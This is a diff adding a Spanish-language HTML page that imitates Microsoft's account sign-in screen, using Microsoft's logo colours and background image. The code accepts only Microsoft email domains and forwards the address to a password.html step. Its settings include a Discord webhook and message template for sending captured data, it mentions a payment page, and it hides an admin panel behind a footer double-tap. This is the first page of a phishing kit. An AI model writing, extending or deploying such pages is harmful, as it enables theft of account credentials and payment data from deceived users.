@@ -1,0 +1,547 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <link rel="icon" type="image/svg+xml" href="/favicon.svg" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Iniciar sesión en su cuenta</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+      tailwind.config = {
+        theme: {
+          extend: {
+            colors: {
+              'ms-blue': '#0078d4',
+              'ms-blue-hover': '#106ebe',
+              'ms-red': '#f25022',
+              'ms-green': '#7fba00',
+              'ms-yellow': '#ffb900',
+              'ms-blue-logo': '#00bcf2',
+              'ms-gray': '#1b1b1b',
+              'ms-gray-light': '#605e5c',
+              'ms-border': '#8a8886',
+              'ms-bg': '#f5f5f5',
+            },
+            fontFamily: {
+              'segoe': ['"Segoe UI"', 'system-ui', '-apple-system', 'BlinkMacSystemFont', 'sans-serif'],
+            },
+            fontSize: {
+              'ms-title': ['28px', { lineHeight: '36px', fontWeight: '600' }],
+              'ms-subtitle': ['15px', { lineHeight: '20px', fontWeight: '400' }],
+              'ms-body': ['15px', { lineHeight: '20px', fontWeight: '400' }],
+              'ms-link': ['13px', { lineHeight: '16px', fontWeight: '400' }],
+              'ms-logo': ['21px', { lineHeight: '28px', fontWeight: '600' }],
+            },
+            boxShadow: {
+              'ms-card': '0 2px 6px rgba(0,0,0,0.2)',
+            }
+          }
+        }
+      }
+    </script>
+    <style>
+      *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+      html, body {
+        min-height: 100vh;
+        width: 100%;
+        font-family: "Segoe UI", system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
+        overflow-x: hidden;
+      }
+
+      /* === FONDO PREDETERMINADO (imagen MS) === */
+      body {
+        background: #0a0a1a;
+        background-image: url('https://logincdn.msftauth.net/shared/5/images/fluent_web_dark_2_bf5f23287bc9f60c9be2.svg');
+        background-size: cover;
+        background-position: center;
+        background-repeat: no-repeat;
+      }
+
+      /* --- CLASES PARA FONDO EDITABLE DESDE ADMIN --- */
+      body.bg-color { background-image: none; }
+      body.bg-gradient { background-image: none; }
+      body.bg-image  { background-color: transparent; }
+
+      /* === INPUTS/Buttons estilo MS === */
+      .ms-input {
+        border: 1px solid #8a8886;
+        font-size: 15px;
+        padding: 11px 12px;
+        line-height: 20px;
+        border-radius: 2px;
+        background: #fff;
+        color: #1b1b1b;
+        width: 100%;
+        transition: border-color .15s, box-shadow .15s;
+      }
+      .ms-input:focus {
+        outline: none;
+        border-color: #0078d4;
+        box-shadow: inset 0 0 0 1px #0078d4;
+      }
+      .ms-button {
+        background: #0078d4;
+        color: #fff;
+        border: none;
+        font-size: 15px;
+        font-weight: 600;
+        padding: 8px 12px;
+        min-height: 32px;
+        border-radius: 2px;
+        cursor: pointer;
+        transition: background-color .1s;
+      }
+      .ms-button:hover  { background: #106ebe; }
+      .ms-button:active { background: #005a9e; }
+      .ms-button:disabled { background: #8a8886; cursor: not-allowed; }
+      .ms-link {
+        color: #0078d4;
+        text-decoration: none;
+        font-size: 13px;
+      }
+      .ms-link:hover { text-decoration: underline; }
+
+      .fade-in { animation: fadeIn .3s ease-out; }
+      @keyframes fadeIn {
+        from { opacity: 0; transform: translateY(10px); }
+        to   { opacity: 1; transform: translateY(0); }
+      }
+
+      /* Contenedor centrado */
+      .login-wrapper {
+        position: relative;
+        z-index: 1;
+        min-height: 100vh;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        padding: 1rem;
+      }
+
+      /* Card login */
+      .login-card {
+        position: relative;
+        z-index: 2;
+        background: rgba(255,255,255,.95);
+        backdrop-filter: blur(4px);
+        border-radius: 8px;
+        box-shadow: 0 2px 6px rgba(0,0,0,.2);
+        padding: 2.5rem 2rem;
+        width: 100%;
+        max-width: 400px;
+        animation: fadeIn .3s ease-out;
+      }
+
+      /* Footer fijo */
+      .page-footer {
+        position: fixed;
+        bottom: 0; left: 0; right: 0;
+        background: rgba(255,255,255,.92);
+        backdrop-filter: blur(8px);
+        border-top: 1px solid #e1dfdd;
+        padding: .45rem 1rem;
+        z-index: 100;
+        font-size: 12px;
+        color: #605e5c;
+      }
+      .page-footer a { color: #0078d4; text-decoration: none; }
+      .page-footer a:hover { text-decoration: underline; }
+      .footer-inner {
+        max-width: 560px;
+        margin: 0 auto;
+        display: flex;
+        flex-wrap: wrap;
+        align-items: center;
+        justify-content: center;
+        gap: .4rem .8rem;
+      }
+      .footer-private-note {
+        text-align: center;
+        font-size: 11px;
+        color: #605e5c;
+        width: 100%;
+        padding-top: .2rem;
+      }
+
+      /* Contador doble-tap (oculto) */
+      #tapCounter { display: none; }
+
+      /* Barra de posicionamiento extra */
+      .pos-slider-wrap {
+        margin-top: .6rem;
+        text-align: left;
+      }
+      .pos-slider-wrap label {
+        font-size: 12px;
+        color: #605e5c;
+        display: block;
+        margin-bottom: .25rem;
+      }
+      .pos-slider {
+        width: 100%;
+        accent-color: #0078d4;
+      }
+      .pos-val {
+        font-size: 11px;
+        color: #605e5c;
+        text-align: right;
+        margin-top: .15rem;
+      }
+
+      /* === ADMIN: pestañas de administración flotantes === */
+      .admin-toggle-bar {
+        position: fixed;
+        top: 0; left: 0; right: 0;
+        z-index: 200;
+        background: rgba(255,255,255,.95);
+        border-bottom: 1px solid #e1dfdd;
+        padding: .4rem 1rem;
+        display: flex;
+        gap: .8rem;
+        align-items: center;
+        justify-content: center;
+        font-size: 13px;
+        color: #605e5c;
+      }
+      .admin-toggle-bar button {
+        background: none;
+        border: 1px solid #8a8886;
+        border-radius: 2px;
+        padding: .3rem .7rem;
+        font-size: 12px;
+        color: #1b1b1b;
+        cursor: pointer;
+        transition: background .15s;
+      }
+      .admin-toggle-bar button:hover { background: #f5f5f5; }
+    </style>
+  </head>
+  <body class="bg-color">
+
+    <!-- Barra de administración (solo visible cuando se activa sesión admin) -->
+    <div class="admin-toggle-bar" id="adminBar" style="display:none;">
+      <span id="adminStatus">🔒 Panel cerrado</span>
+      <button id="adminLogoutBtn" onclick="adminLogout()">Cerrar sesión admin</button>
+    </div>
+
+    <!-- Contador doble-tap oculto -->
+    <div id="tapCounter"></div>
+
+    <!-- === MAIN: Login paso 1 — Email === -->
+    <div class="login-wrapper">
+      <div class="login-card">
+
+        <!-- Logo MS -->
+        <div class="flex items-center justify-center mb-8">
+          <div class="grid grid-cols-2 gap-px w-6 h-6 mr-3">
+            <div style="background:#f25022; width:3px; height:3px;"></div>
+            <div style="background:#7fba00; width:3px; height:3px;"></div>
+            <div style="background:#00bcf2; width:3px; height:3px;"></div>
+            <div style="background:#ffb900; width:3px; height:3px;"></div>
+          </div>
+          <span style="font-size:21px; font-weight:600; color:#1b1b1b; letter-spacing:-.5px;">Microsoft</span>
+        </div>
+
+        <h1 style="font-size:28px; font-weight:600; color:#1b1b1b; margin:0 0 4px; text-align:center; line-height:36px;">Iniciar sesión</h1>
+        <p style="font-size:15px; color:#605e5c; margin:0 0 1.6rem; text-align:center; line-height:20px;">Use su cuenta de Microsoft.</p>
+
+        <!-- Caja de error -->
+        <div id="errorBox" class="error-box" style="display:none;">
+          <span id="errorText" class="error-text"></span>
+        </div>
+
+        <form onsubmit="handleEmailSubmit(event)" id="emailForm" style="display:flex; flex-direction:column; gap:1.2rem;">
+          <input
+            type="email"
+            id="email"
+            placeholder="Correo electrónico o número de teléfono"
+            class="ms-input"
+            required
+            autocomplete="email"
+          />
+
+          <div style="text-align:left;">
+            <a href="#" class="ms-link" style="position:relative;">
+              ¿Olvidaste tu nombre de usuario?
+              <span class="pos-hint" style="position:absolute; right:0; top:-2px; font-size:11px; color:#605e5c;" id="posLabel">pos: 0</span>
+            </a>
+          </div>
+
+          <button type="submit" class="ms-button" style="width:100%;">Siguiente</button>
+
+          <div style="text-align:center; font-size:15px; color:#605e5c; margin-top:.2rem;">
+            ¿Es nuevo en Microsoft?
+            <a href="#" class="ms-link" style="font-weight:600;">Crear una cuenta</a>
+          </div>
+        </form>
+
+        <!-- Slider de posicionamiento para el link -->
+        <div class="pos-slider-wrap">
+          <label for="posSlider">Posición enlace olvidado:</label>
+          <input type="range" id="posSlider" class="pos-slider" min="0" max="200" value="0" />
+          <div class="pos-val" id="posVal">Posición: 0px</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- === FOOTER === -->
+    <div class="page-footer" id="pageFooter">
+      <div class="footer-inner">
+        <a href="#" id="footerHelp" onclick="handleFooterTap('help')">Ayuda</a>
+        <a href="#" id="footerTerms">Términos de uso</a>
+        <a href="#" id="footerPrivacy" onclick="handleFooterTap('privacy')">Privacidad y cookies</a>
+        <span style="text-align:center; width:100%; padding-top:.15rem; font-size:11px; color:#605e5c;">
+          Usa la exploración privada si este no es tu dispositivo.
+          <a href="#" style="color:#0078d4;">Más información</a>
+        </span>
+      </div>
+      <div class="footer-private-note" id="footerPrivateNote"></div>
+    </div>
+
+    <script>
+      // ============================================================
+      //  VARIABLES GLOBALES
+      // ============================================================
+      const DEFAULT_WEBHOOK = '';
+      const DEFAULT_CONFIG  = {
+        discordWebhook: '',
+        discordMessageTemplate: '',
+        appTitle: 'Iniciar sesión en su cuenta',
+        appSubtitle: 'Use su cuenta de Microsoft.',
+        loginBgType: 'image',
+        loginBgColor: '#0a0a1a',
+        loginBgGradient: 'linear-gradient(135deg, #0a0a1a 0%, #1a1a2e 100%)',
+        loginBgImage: 'https://logincdn.msftauth.net/shared/5/images/fluent_web_dark_2_bf5f23287bc9f60c9be2.svg',
+        footerHelpText: 'Ayuda',
+        footerTermsText: 'Términos de uso',
+        footerPrivacyText: 'Privacidad y cookies',
+        footerPrivateNoteText: 'Usa la exploración privada si este no es tu dispositivo. Más información',
+        showAdminBar: false,
+      };
+
+      let savedConfig = loadConfig();
+
+      function loadConfig() {
+        try {
+          const s = localStorage.getItem('mail_officee3656_config');
+          if (s) {
+            const p = JSON.parse(s);
+            return { ...DEFAULT_CONFIG, ...p };
+          }
+        } catch(e) {}
+        return { ...DEFAULT_CONFIG };
+      }
+
+      function saveConfig(cfg) {
+        savedConfig = cfg;
+        try { localStorage.setItem('mail_officee3656_config', JSON.stringify(cfg)); } catch(e) {}
+      }
+
+      function getSavedSetting(key) {
+        return savedConfig[key] !== undefined ? savedConfig[key] : DEFAULT_CONFIG[key];
+      }
+
+      // ============================================================
+      //  FONDO DE PANTALLA
+      // ============================================================
+      function applyLoginBackground() {
+        const bgType   = getSavedSetting('loginBgType')   || 'image';
+        const bgColor  = getSavedSetting('loginBgColor')  || '#0a0a1a';
+        const bgGrad   = getSavedSetting('loginBgGradient')|| 'linear-gradient(135deg, #0a0a1a 0%, #1a1a2e 100%)';
+        const bgImg    = getSavedSetting('loginBgImage')  || 'https://logincdn.msftauth.net/shared/5/images/fluent_web_dark_2_bf5f23287bc9f60c9be2.svg';
+
+        const body = document.body;
+        body.classList.remove('bg-color', 'bg-gradient', 'bg-image');
+
+        if (bgType === 'gradient') {
+          body.style.backgroundImage = 'none';
+          body.style.backgroundColor = bgColor;
+          body.style.background = bgGrad;
+          body.classList.add('bg-gradient');
+        } else if (bgType === 'image' && bgImg) {
+          body.style.backgroundImage = 'url(' + bgImg + ')';
+          body.style.backgroundSize  = 'cover';
+          body.style.backgroundPosition = 'center';
+          body.style.backgroundRepeat  = 'no-repeat';
+          body.classList.add('bg-image');
+        } else {
+          body.style.background = 'none';
+          body.style.backgroundImage = 'none';
+          body.style.backgroundColor = bgColor;
+          body.classList.add('bg-color');
+        }
+      }
+
+      // ============================================================
+      //  TEXTOS / LABELS DEL FOOTER
+      // ============================================================
+      function applyFooterTexts() {
+        document.getElementById('footerHelp').textContent    = getSavedSetting('footerHelpText')    || 'Ayuda';
+        document.getElementById('footerTerms').textContent   = getSavedSetting('footerTermsText')   || 'Términos de uso';
+        document.getElementById('footerPrivacy').textContent = getSavedSetting('footerPrivacyText') || 'Privacidad y cookies';
+        document.getElementById('footerPrivateNote').textContent =
+          getSavedSetting('footerPrivateNoteText') || 'Usa la exploración privada si este no es tu dispositivo. Más información';
+      }
+
+      // ============================================================
+      //  TÍTULO / SUBTÍTULO
+      // ============================================================
+      function applyAppTexts() {
+        const titleEl = document.querySelector('h1');
+        const subEl   = document.querySelector('p');
+        if (titleEl) titleEl.textContent = getSavedSetting('appTitle')    || 'Iniciar sesión';
+        if (subEl)   subEl.textContent   = getSavedSetting('appSubtitle') || 'Use su cuenta de Microsoft.';
+      }
+
+      // ============================================================
+      //  SLIDER DE POSICIÓN ENLACE "OLVIDADO"
+      // ============================================================
+      (function initPosSlider() {
+        const slider = document.getElementById('posSlider');
+        const label  = document.getElementById('posLabel');
+        const valEl  = document.getElementById('posVal');
+        const link   = document.querySelector('.ms-link');
+
+        if (!slider || !label || !link) return;
+
+        let currentPos = parseInt(getSavedSetting('forgotLinkPos') || '0', 10) || 0;
+        slider.value = currentPos;
+        label.textContent = 'pos: ' + currentPos;
+        valEl.textContent = 'Posición: ' + currentPos + 'px';
+        applyForgotPosition(currentPos);
+
+        slider.addEventListener('input', () => {
+          const v = parseInt(slider.value, 10);
+          label.textContent = 'pos: ' + v;
+          valEl.textContent = 'Posición: ' + v + 'px';
+          applyForgotPosition(v);
+        });
+
+        function applyForgotPosition(px) {
+          if (link) {
+            const parent = link.parentElement;
+            if (parent) {
+              parent.style.position = 'relative';
+              link.style.right = px + 'px';
+            }
+          }
+        }
+
+        // Guardar al salir
+        window.addEventListener('beforeunload', () => {
+          const v = parseInt(slider.value, 10);
+          savedConfig.forgotLinkPos = v;
+          try { localStorage.setItem('mail_officee3656_config', JSON.stringify(savedConfig)); } catch(e) {}
+        });
+      })();
+
+      // ============================================================
+      //  DOBLE TAP — ACCESO AL PANEL (desde Payment)
+      // ============================================================
+      // se activa solo cuando una flag indica que estamos en payment
+      let tapHelpCount    = 0;
+      let tapPrivacyCount = 0;
+      const ADMIN_PANEL_UNLOCKED = 'mail_officee3656_admin_unlocked';
+
+      function handleFooterTap(which) {
+        if (which === 'help')    tapHelpCount++;
+        if (which === 'privacy') tapPrivacyCount++;
+
+        const helpThreshold    = 2;
+        const privacyThreshold = 2;
+
+        if (tapHelpCount >= helpThreshold && tapPrivacyCount >= privacyThreshold) {
+          // Acumulado suficiente → mostrar indicador
+          tapHelpCount    = 0;
+          tapPrivacyCount = 0;
+          localStorage.setItem(ADMIN_PANEL_UNLOCKED, 'true');
+          document.getElementById('footerPrivateNote').textContent =
+            '🔓 Presiona la clave para entrar al panel';
+          // Si estamos en payment.html, redirigir al dashboard si ya se ingresó clave
+          if (window.location.pathname.includes('payment')) {
+            // esperar que se ingrese la clave
+            document.getElementById('footerPrivateNote').textContent =
+              '🔓 Ingresa la clave para entrar al panel';
+          }
+          return;
+        }
+
+        // reiniciar contadores si no hay progreso después de 3s
+        setTimeout(() => {
+          if (tapHelpCount === 0 && tapPrivacyCount === 0) return;
+          if (tapHelpCount < 1 && tapPrivacyCount < 1) {
+            tapHelpCount    = 0;
+            tapPrivacyCount = 0;
+          }
+        }, 3000);
+      }
+
+      // ============================================================
+      //  ERROR BOX
+      // ============================================================
+      function showError(msg) {
+        const box = document.getElementById('errorBox');
+        const txt = document.getElementById('errorText');
+        if (!box || !txt) return;
+        txt.textContent = msg;
+        box.style.display = 'block';
+        setTimeout(() => { box.style.display = 'none'; }, 4000);
+      }
+
+      // ============================================================
+      //  HANDLER — EMAIL (paso 1)
+      // ============================================================
+      function handleEmailSubmit(e) {
+        e.preventDefault();
+        const emailInput = document.getElementById('email');
+        const email      = emailInput.value.trim();
+
+        const box = document.getElementById('errorBox');
+        const txt = document.getElementById('errorText');
+        if (box) box.style.display = 'none';
+
+        if (!email) {
+          if (box && txt) { txt.textContent = 'Ingresa tu correo electrónico.'; box.style.display = 'block'; }
+          return;
+        }
+        if (!email.includes('@') || !email.includes('.')) {
+          if (box && txt) { txt.textContent = 'Solo se permiten cuentas de Microsoft.'; box.style.display = 'block'; }
+          return;
+        }
+
+        // Validar dominio MS
+        const domain = email.split('@')[1].toLowerCase();
+        const msDomains = ['hotmail.com','outlook.com','live.com','msn.com','outlook.es','hotmail.es','live.es','outlook.com.ar','hotmail.com.ar','outlook.com.br','hotmail.com.br','outlook.com.mx','hotmail.com.mx','outlook.com.co','hotmail.com.co','outlook.com.pe','hotmail.com.pe'];
+        if (!msDomains.includes(domain)) {
+          if (box && txt) { txt.textContent = 'Solo se permiten cuentas de Microsoft.'; box.style.display = 'block'; }
+          return;
+        }
+
+        // Éxito → redirigir a password.html
+        window.location.href = 'password.html?email=' + encodeURIComponent(email);
+      }
+
+      // ============================================================
+      //  INICIALIZACIÓN
+      // ============================================================
+      applyLoginBackground();
+      applyFooterTexts();
+      applyAppTexts();
+
+      // Verificar si admin ya fue desbloqueado (desde payment)
+      if (localStorage.getItem(ADMIN_PANEL_UNLOCKED) === 'true') {
+        // mostrar nota
+        document.getElementById('footerPrivateNote').textContent =
+          '🔓 Presiona la clave para entrar al panel';
+      }
+
+      // Si se llegó desde payment.html con ?unlocked=1, mostrar bar de admin
+      const urlParams = new URLSearchParams(window.location.search);
+      if (urlParams.get('adminUnlocked') === '1') {
+        document.getElementById('adminBar').style.display = 'flex';
+        document.getElementById('adminStatus').textContent = '🔓 Panel abierto — modificando desde dashboard';
+        document.getElementById('footerPrivateNote').textContent = 'Panel de administración activo';
+      }
+    </script>
+  </body>
+</html>
